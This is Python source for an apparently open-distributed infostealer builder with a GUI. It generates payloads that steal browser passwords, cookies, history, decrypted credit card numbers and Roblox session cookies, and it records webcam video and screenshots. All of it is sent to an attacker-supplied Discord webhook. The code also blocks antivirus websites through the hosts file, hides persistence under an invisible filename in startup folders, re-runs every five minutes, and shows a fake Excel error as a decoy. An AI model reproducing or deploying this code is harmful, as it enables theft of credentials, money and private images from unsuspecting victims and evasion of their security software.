            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                
                path = f"- [+] |PATH|: {row[1]}"
                url = f"  |URL|: {row[0]}"
                __DOWNLOADS__.append(Types.Download(path, url))

            conn.close()
            os.remove('downloads_db')

        def get_credit_cards(self, path: str, profile: str):
            cards_db = f'{path}\\{profile}\\Web Data'
            if not os.path.exists(cards_db):
                return

            shutil.copy(cards_db, 'cards_db')
            conn = sqlite3.connect('cards_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                name = f"- [+] |NAME|: {row[0]}"
                expiration_month = f"  |EXPIRATION MOUNTH|: {row[1]}"
                expiration_year = f"  |EXPIRATION YEAR|: {row[2]}"
                card_number = f"  |CARD NUMBER|: {self.decrypt_password(row[3], self.master_key)}"
                date_modified = f"  |DATE MODIFIED|: {row[4]}"
                __CARDS__.append(Types.CreditCard(name, expiration_month, expiration_year, card_number, date_modified))

            conn.close()
            os.remove('cards_db')


    class Types:
        class Login:
            def __init__(self, url, username, password):
                self.url = url
                self.username = username
                self.password = password

            def __str__(self):
                return f'{self.url}\t{self.username}\t{self.password}'

            def __repr__(self):
                return self.__str__()

        class Cookie:
            def __init__(self, host, name, path, value, expires):
                self.host = host
                self.name = name
                self.path = path
                self.value = value
                self.expires = expires

            def __str__(self):
                return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

            def __repr__(self):
                return self.__str__()

        class WebHistory:
            def __init__(self, url, title, timestamp):
                self.url = url
                self.title = title
                self.timestamp = timestamp

            def __str__(self):
                return f'{self.url}\t{self.title}\t{self.timestamp}'

            def __repr__(self):
                return self.__str__()

        class Download:
            def __init__(self, tab_url, target_path):
                self.tab_url = tab_url
                self.target_path = target_path

            def __str__(self):
                return f'{self.tab_url}\t{self.target_path}'

            def __repr__(self):
                return self.__str__()

        class CreditCard:
            def __init__(self, name, month, year, number, date_modified):
                self.name = name
                self.month = month
                self.year = year
                self.number = number
                self.date_modified = date_modified

            def __str__(self):
                return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

            def __repr__(self):
                return self.__str__()
            
    Browser(webhook_url)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

RobloxGrab = r'''
def Roblox_Grab():
    def get_cookie_and_navigator(browser_function):
        try:
            cookies = browser_function()
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            navigator = browser_function.__name__
            return cookie, navigator
        except Exception as e:
            return None, None

    def Edge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Chrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    browsers = [Edge, Chrome, Firefox, Opera, Safari, Brave]
    for browser in browsers:
        cookie, navigator = get_cookie_and_navigator(browser)
        if cookie:
            try:
                info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
                information = json.loads(info.text)
            except:
                pass

            try:
                username_roblox = information['UserName']
            except:
                username_roblox = "None"

            try:
                user_id_roblox = information["UserID"]
            except:
                user_id_roblox = "None"

            try:
                robux_roblox = information["RobuxBalance"]
            except:
                robux_roblox = "None"

            try:
                premium_roblox = information["IsPremium"]
            except:
                premium_roblox = "None"

            try:
                avatar_roblox = information["ThumbnailUrl"]
            except:
                avatar_roblox = avatar_embed

            try:
                builders_club_roblox = information["IsAnyBuildersClubMember"]
            except:
                builders_club_roblox = "None"
    
            size_cookie = len(cookie)
            middle_cookie = size_cookie // 2
            cookie_part1 = cookie[:middle_cookie]
            cookie_part2 = cookie[middle_cookie:]

            client = SyncWebhook.from_url(webhook_url)

            embed = discord.Embed(
                title=f':video_game: | Roblox Info `{username_pc} "{ip_address_public}"`:',
                color=color_embed
            )
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            embed.set_thumbnail(url=avatar_roblox)
            embed.add_field(name=":compass: | Navigator:", value=f"```{navigator}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: | Username:", value=f"```{username_roblox}```", inline=True)
            embed.add_field(name=":robot: | Id:", value=f"```{user_id_roblox}```", inline=True)
            embed.add_field(name=":moneybag: | Robux:", value=f"```{robux_roblox}```", inline=True)
            embed.add_field(name=":tickets: | Premium:", value=f"```{premium_roblox}```", inline=True)
            embed.add_field(name=":construction_site: | Builders Club:", value=f"```{builders_club_roblox}```", inline=True)
            embed.add_field(name=":cookie: | Cookie Part 1:", value=f"```{cookie_part1}```", inline=False)
            embed.add_field(name=":cookie: | Cookie Part 2:", value=f"```{cookie_part2}```", inline=False)

            client.send(embed=embed, username=username_embed,
                              avatar_url=avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

CameraCaptureGrab = r'''
def Camera_Capture_Grab():
    try:
        from datetime import datetime
        time_capture = 10
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            Clear()
            return

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        name_file_capture = f"CameraCapture_{username_pc}.avi"
        path_file_capture = os.path.join(os.getcwd(), name_file_capture)
        out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
        time_start = datetime.now()
        Clear()
        while (datetime.now() - time_start).seconds < time_capture:
            Clear()
            ret, frame = cap.read()
            if not ret:
                Clear()
                break
            out.write(frame)

        cap.release()
        out.release()
        Clear()
        if os.path.exists(path_file_capture):
            embed = Embed(title=f":camera: | Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
            embed.set_footer(text=footer_text, icon_url=avatar_embed)

            webhook = SyncWebhook.from_url(webhook_url)
            with open(path_file_capture, "rb") as f:
                webhook.send(
                    embed=embed,
                    file=File(f, filename=name_file_capture),
                    username=username_embed,
                    avatar_url=avatar_embed
                )
            if os.path.exists(path_file_capture):
                os.remove(path_file_capture)
        Clear()
    except:
        Clear()
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

ScreenshotGrab = r'''
def Screenshot_Grab():
    try:
        embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
        name_file_screen = f"Screenshot_{username_pc}.png"
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(name_file_screen)

        embed.set_image(url=f"attachment://{name_file_screen}")

        embed.set_footer(text=footer_text, icon_url=avatar_embed )
        webhook = SyncWebhook.from_url(webhook_url)
        webhook.send(
                embed=embed,
                file=File(f'.\\{name_file_screen}', filename=name_file_screen),
                username=username_embed,
                avatar_url=avatar_embed
            )
        
        if os.path.exists(name_file_screen):
            os.remove(name_file_screen)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

BlockWebsite = r'''
def Block_Website():
    try:
        directory = os.getcwd()
        disk_letter = os.path.splitdrive(directory)[0]

        def block_website(website):
            hosts_path = f"{disk_letter}\\Windows\\System32\\drivers\\etc\\hosts"
            if os.path.exists(hosts_path):
                pass
            else:
                hosts_path = f"C:\\Windows\\System32\\drivers\\etc\\hosts"

            redirect = "127.0.0.1"
            with open(hosts_path, "a") as file:
                file.write("\n" + redirect + " " + website)
        
        websites_to_block = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for website in websites_to_block:
            block_website(website)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Startup = r'''
def Startup():
   try:
    try:
        path_script = os.path.abspath(__file__)
        new_name = "ㅤ.py"

        if sys.platform.startswith('win'):  
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        else:
            pass
        path_new_file = os.path.join(folder, new_name)

        shutil.copy(path_script, path_new_file)
        os.chmod(path_new_file, 0o777) 
    except:
        path_script = sys.executable
        new_name = "ㅤ.exe"
        if sys.platform.startswith('win'):  
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
            
        path_new_file = os.path.join(folder, new_name)
        shutil.copy(path_script, path_new_file)
        os.chmod(path_new_file, 0o777)
   except:
       pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Start = r'''
payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)
try:
    Block_Website()
except:
    pass
try:
    Startup()
except:
    pass
try:
    System_Grab()
except:
    pass
try:
    Camera_Capture_Grab()
except:
    pass
try:
    Screenshot_Grab()
except:
    pass
try:
    Discord_Grab()
except:
    pass
try:
    Browser_Grab()
except:
    pass
try:
    Roblox_Grab()
except:
    pass

payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)

try:
    Fake_Error()
except:
    pass
Clear()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Restart = r'''
while True:
    time.sleep(300)

    payload = {
    'content': f'****╔════════════════════Injection═══════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(webhook_url, json=payload)
    try:
        Block_Website()
    except:
        pass
    try:
        System_Grab()
    except:
        pass
    try:
        Roblox_Grab()
    except:
        pass
    try:
        Screenshot_Grab()
    except:
        pass
    try:
        Camera_Capture_Grab()
    except:
        pass
    try:
        Discord_Grab()
    except:
        pass
    try:
        Browser_Grab()
    except:
        pass
    Clear()
    payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(webhook_url, json=payload)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

FakeError = r'''
def Fake_Error():
    file = "Error.vbs"
    code = """
    x=msgbox("The file is corrupt and cannot be opened.", 16, "Microsoft Excel")
    """
    try:
        with open(file, "w") as filevbs:
            filevbs.write(code)
        Clear()
        subprocess.run(["cscript", file], shell=True)
        Clear()
        os.remove(file)
    except:
        Clear()
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

from Config.Util import *
from Config.Config import *
try:
    import random
    import os
    import subprocess
    import shutil
    import tkinter as tk
    import time
    import json
    from tkinter import filedialog
    from tkinter import ttk
except Exception as e:
    ErrorModule(e)

Clear()
Title("Builder Stealer")

print(f"""
                 {red} ██▀███  ▓█████ ▓█████▄      ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓    ▓█████  ██▀███  
                 {red}▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
                 {red}▓██ ░▄█ ▒▒███   ░██   █▌   ░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░    ▒███   ▓██ ░▄█ ▒
                 {red}▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌     ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
                 {red}░██▓ ▒██▒░▒████▒░▒████▓    ▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒░▒████▒░██▓ ▒██▒
                 {red}░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒    ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
                 {red}  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒    ░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
                 {red}  ░░   ░    ░    ░ ░  ░    ░  ░  ░    ░         ░    ░   ▒     ░ ░      ░     ░░   ░ 
                 {red}   ░        ░  ░   ░             ░              ░  ░     ░  ░    ░  ░   ░  ░   ░     
                 {red}                 ░                                                                   
    
                                           {white}{github_tool}
    {white}╔═════════════╦═══════════════╦═══════════════╦═══════════════╦══════════════════╦════════════╦════════════════╗
    {white}║ {red}System Info{white} ║ {red}Discord Token{white} ║ {red}Browser Steal{white} ║ {red}Roblox Cookie{white} ║ {red}Block AV Website{white} ║ {red}Screenshot{white} ║ {red}Camera Capture{white} ║
    {white}╚═════════════╩═══════════════╩═══════════════╩═══════════════╩══════════════════╩════════════╩════════════════╝

{INFO} File detected by the antivirus, but be aware that there is no backdoor!  
{INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
{INFO} Deactivate your antivirus so that no files are deleted after your build.""")
print(f"{INPUT} Custom your stealer:")

def disinfect():
    try:
        script_path = "./Settings/Program/Builder-Disinfect.py"
        if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1) <= 32:
            raise ctypes.WinError()
        print(f"{red}[{white}{current_time_hour()}{red}] {INFO} Disinfection is successfully, restart your pc.")
    except Exception as e:
        print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Error during disinfection: {white}{e}")

def choose_icon():
    global icon_path
    try:
        if sys.platform.startswith("win"):
            root = tk.Tk()
            root.iconbitmap('Img/RedTiger_icon.ico')
            root.withdraw()
            root.attributes('-topmost', True)
            icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])

        elif sys.platform.startswith("linux"):
            icon_path = filedialog.askopenfilename(title="Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
    except:
        pass

# <<<<<<<<<< Windows & Settings >>>>>>>>>>
root = tk.Tk()
style = ttk.Style()
if sys.platform.startswith("win"):
    root.iconbitmap('Img/RedTiger_icon.ico')
root.title(f'{name_tool} {version_tool} | Builder Stealer')
root.geometry("890x440")
root.resizable(False, False)
red_color = '#a80505'
white_color = "#ffffff"
background_color = "#141414"
root.configure(background=background_color) 

# <<<<<<<<<< Title >>>>>>>>>>
label_title = tk.Label(root, text="Builder Options", font=("Calibri", 30), background=background_color, foreground=white_color)
label_title.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))

# <<<<<<<<<< Webhook Entry >>>>>>>>>>
if sys.platform.startswith("win"):
    def on_entry_focus_in(event):
        if webhook_entry.get() == "Webhook URL":
            webhook_entry.delete(0, "end")
            webhook_entry.config(fg="white")

    def on_entry_focus_out(event):
        if webhook_entry.get() == "":
            webhook_entry.insert(0, "Webhook URL")
            webhook_entry.config(fg="white")

webhook_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12))
webhook_entry.grid(row=1, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
webhook_entry.insert(0, "Webhook URL")

if sys.platform.startswith("win"):
    webhook_entry.bind("<FocusIn>", on_entry_focus_in)
    webhook_entry.bind("<FocusOut>", on_entry_focus_out)
    root.grid_columnconfigure(0, weight=0) 
    webhook_entry.config(width=60)

# <<<<<<<<<< Select Options >>>>>>>>>>
add_system = "Disable"
add_discord = "Disable"
add_browser = "Disable"
add_roblox = "Disable"
add_blockwebsite = "Disable"
add_cameracapture = "Disable"
add_screenshot = "Disable"
add_startup = "Disable"
add_fake_error = "Disable"
add_restart = "Disable"
webhook = "None"
name_file = "None"
icon_path = ""

add_system_var = tk.StringVar(value="Disable")
add_discord_var = tk.StringVar(value="Disable")
add_browser_var = tk.StringVar(value="Disable")
add_roblox_var = tk.StringVar(value="Disable")
add_blockwebsite_var = tk.StringVar(value="Disable")
add_cameracapture_var = tk.StringVar(value="Disable")
add_screenshot_var = tk.StringVar(value="Disable")
add_startup_var = tk.StringVar(value="Disable")
add_fake_error_var = tk.StringVar(value="Disable")
add_restart_var = tk.StringVar(value="Disable")
file_type_var = tk.StringVar(value="Python File")

style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=white_color, relief='raised',indicatorsize=20)

add_system_cb = ttk.Checkbutton(root, text="System Info", variable=add_system_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_discord_cb = ttk.Checkbutton(root, text="Discord Token", variable=add_discord_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_browser_cb = ttk.Checkbutton(root, text="Browser Steal", variable=add_browser_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_roblox_cb = ttk.Checkbutton(root, text="Roblox Cookie", variable=add_roblox_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_blockwebsite_cb = ttk.Checkbutton(root, text="Block AV Website", variable=add_blockwebsite_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_cameracapture_cb = ttk.Checkbutton(root, text="Camera Capture", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_screenshot_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')

add_system_cb.grid(row=4, column=0, padx=(220, 20), sticky="w")
add_discord_cb.grid(row=5, column=0, padx=(220, 20), sticky="w")
add_browser_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
add_roblox_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
add_blockwebsite_cb.grid(row=8, column=0, padx=(220, 20), sticky="w")
add_cameracapture_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
add_screenshot_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
add_fake_error_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
add_startup_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
add_restart_cb.grid(row=8, column=1, padx=(5, 10), sticky="w")


# <<<<<<<<<< Button Style >>>>>>>>>>
style.configure('Red.TButton', borderwidth=0, background=background_color, font=('Calibri', 12, "bold"), foreground=background_color)

# <<<<<<<<<< File Name Entry >>>>>>>>>>
if sys.platform.startswith("win"):
    def on_entry_focus_in(event):
        if name_file_entry.get() == "File Name":
            name_file_entry.delete(0, "end")
            name_file_entry.config(fg="white")

    def on_entry_focus_out(event):
        if name_file_entry.get() == "":
            name_file_entry.insert(0, "File Name")
            name_file_entry.config(fg="white")

name_file_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12), width=20)
name_file_entry.grid(row=9, column=0, padx=(60, 0), pady=(20, 10))
name_file_entry.insert(0, "File Name")

if sys.platform.startswith("win"):
    name_file_entry.bind("<FocusIn>", on_entry_focus_in)
    name_file_entry.bind("<FocusOut>", on_entry_focus_out)

# <<<<<<<<<< Select Icon >>>>>>>>>>

icon_button = ttk.Button(root, text="Select Icon", command=choose_icon, style='Red.TButton')
icon_button.grid(row=9, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
icon_button.config(compound="right")

if file_type_var.get() == "Python File":
    icon_button.config(state="disabled")

root.grid_columnconfigure(0, minsize=0) 

# <<<<<<<<<< Select File Type >>>>>>>>>>
def file_type_changed(*args):
    if file_type_var.get() == "Python File":
        icon_button.config(state="disabled")
    elif file_type_var.get() == "File Type":
        icon_button.config(state="disabled")
    else:
        icon_button.config(state="normal")

try:
    file_type_var = tk.StringVar(value="File Type")
    file_type_var.trace_add("write", file_type_changed)
except:
    pass

file_type_menu = ttk.OptionMenu(root, file_type_var, *["File Type", "Python File", "Exe File"], style='Red.TButton')
file_type_menu.grid(row=9, column=1, sticky="w", padx=(0, 200), pady=(20, 10))
file_type_menu.config(compound="right")

# <<<<<<<<<< Build Button >>>>>>>>>>
def Build_Settings():
    global add_system, add_discord, add_browser, add_roblox, add_blockwebsite, add_cameracapture, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, file_type
    add_system = add_system_var.get()
    add_discord = add_discord_var.get()
    add_browser = add_browser_var.get()
    add_roblox = add_roblox_var.get()
    add_blockwebsite = add_blockwebsite_var.get()
    add_cameracapture = add_cameracapture_var.get()
    add_screenshot = add_screenshot_var.get()
    add_startup = add_startup_var.get()
    add_fake_error = add_fake_error_var.get()
    add_restart = add_restart_var.get()
    webhook = webhook_entry.get()
    name_file = name_file_entry.get()

    if file_type_var.get() == "Python File":
        file_type = "Python File"
    else:
        file_type = "Exe File"
    
    if not name_file.strip() or name_file in ["File Name"]:
        random_number = random.randint(1, 1000)
        name_file = f'BuilderStealer_{random_number}'

        root.quit()
        root.destroy()

style.configure('CustomButton.TButton', borderwidth=0, background=background_color, font=('Calibri', 15, "bold"), foreground=background_color)

build_button = ttk.Button(root, text="Build Stealer", command=Build_Settings, style='CustomButton.TButton', width=15)
build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(300,0))

# <<<<<<<<<< Disinfinct Button >>>>>>>>>>
disinfect_button = ttk.Button(root, text="Self Disinfect", command=disinfect, style='CustomButton.TButton', width=15)
disinfect_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(0,80))

root.mainloop()

CheckWebhook(webhook)

print(f"{INFO} Webhook            :{white}", webhook)
print(f"{INFO} System Info        :{white}", add_system)
print(f"{INFO} Discord Token      :{white}", add_discord)
print(f"{INFO} Browser Steal      :{white}", add_browser)
print(f"{INFO} Roblox Cookie      :{white}", add_roblox)
print(f"{INFO} Block AV Website   :{white}", add_blockwebsite)
print(f"{INFO} Camera Capture     :{white}", add_cameracapture)
print(f"{INFO} Screenshot         :{white}", add_screenshot)
print(f"{INFO} Launch at Startup  :{white}", add_startup)
print(f"{INFO} Fake Error         :{white}", add_fake_error)
print(f"{INFO} Restart Every 5min :{white}", add_restart)
print(f"{INFO} File Type          :{white}", file_type)
print(f"{INFO} File Name          :{white}", name_file)
print(f"{INFO} Icon Path          :{white}", icon_path)

file_text_relative = f'./1-FileOutput/BuilderStealer/{name_file}.txt'
file_text = os.path.abspath(file_text_relative)

file_python_relative = f'./1-FileOutput/BuilderStealer/{name_file}.py'
file_python = os.path.abspath(file_python_relative)

path_destination_relative = "./1-FileOutput/BuilderStealer"
path_destination = os.path.abspath(path_destination_relative)


print(f"{color.RED}{INFO} Installing missing modules:{color.RESET}")

if sys.platform.startswith("win"):
    "WINDOWS"
    os.system("pip install --upgrade pip setuptools wheel")
    os.system("pip install setuptools")
    os.system("pip install browser_cookie3")
    os.system("pip install opencv-python")
    os.system("pip install Pillow")
    os.system("pip install pywin32")
    os.system("pip install discord")
    os.system("pip install pycryptodome")
    os.system("pip install requests")
    os.system("pip install GPUtil")
    os.system("pip install psutil")
    os.system("pip install screeninfo")
    os.system("pip install discord.py")
    os.system("pip install --upgrade discord.py")
    os.system("pip install pyinstaller")
    os.system("pip install auto-py-to-exe")

elif sys.platform.startswith("linux"):
    "LINUX"
    os.system("pip3 install --upgrade pip setuptools wheel")
    os.system("pip3 install setuptools")
    os.system("pip3 install browser_cookie3")
    os.system("pip3 install opencv-python")
    os.system("pip3 install Pillow")
    os.system("pip3 install pywin32")
    os.system("pip3 install discord")
    os.system("pip3 install pycryptodome")
    os.system("pip3 install requests")
    os.system("pip3 install GPUtil")
    os.system("pip3 install psutil")
    os.system("pip3 install screeninfo")
    os.system("pip3 install discord.py")
    os.system("pip3 install --upgrade discord.py")
    os.system("pip3 install pyinstaller")
    os.system("pip3 install auto-py-to-exe")

time.sleep(3)


